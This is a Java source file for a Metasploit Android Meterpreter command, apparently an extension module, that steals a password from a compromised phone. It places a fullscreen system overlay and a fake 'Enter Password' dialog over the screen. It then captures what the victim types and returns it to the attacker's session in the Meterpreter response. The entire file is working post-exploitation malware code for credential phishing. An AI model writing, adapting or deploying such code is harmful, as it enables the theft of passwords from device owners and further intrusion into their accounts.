// partially implemented by https://stackoverflow.com/questions/18799216/how-to-make-a-edittext-box-in-a-dialog
package com.metasploit.meterpreter.android;

import android.content.Context;
import android.os.Handler;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import android.widget.EditText;
import android.widget.LinearLayout;
import android.app.AlertDialog;
import android.content.DialogInterface;

import java.io.IOException;
import java.lang.reflect.Method;

public class android_password_request implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_PASSWORD_REQUEST = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2);

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();
        Handler handler = new Handler(context.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                SurfaceView surfaceView = new SurfaceView(context);
                SurfaceHolder surfaceHolder = surfaceView.getHolder();

                WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        //WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        //WindowManager.LayoutParams.TYPE_TOAST,
                        //WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        //        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                        //PixelFormat.TRANSLUCENT
                        );
                windowManager.addView(surfaceView, params);

                ///////////////////////
                // https://stackoverflow.com/questions/18799216/how-to-make-a-edittext-box-in-a-dialog
                // create and show the dialog box
                ///////////////////////

                // Creating alert Dialog with one Button
                AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);

                // Setting Dialog Title
                alertDialog.setTitle("PASSWORD");

                // Setting Dialog Message
                alertDialog.setMessage("Enter Password");

                // Add password box
                final EditText input = new EditText(context);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.MATCH_PARENT);
                input.setLayoutParams(lp);
                alertDialog.setView(input);

                // Setting Icon to Dialog
                //alertDialog.setIcon(R.drawable.key);

                // Setting Positive "Yes" Button
                alertDialog.setPositiveButton("YES",
                    new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            try {
                                response.add(TLV_TYPE_PASSWORD_REQUEST, input.getText());
                                //response.addOverflow(TLV_TYPE_PASSWORD_REQUEST, input.getText());
                            }
                            catch(IOException e) {
                              //return ERROR_SUCCESS;
                            }
                        }
                    });
                // closed

                // Showing Alert Message
                alertDialog.show();
            }
        });

        synchronized (this) {
            wait(4000);
        }

        return ERROR_SUCCESS;
    }
}
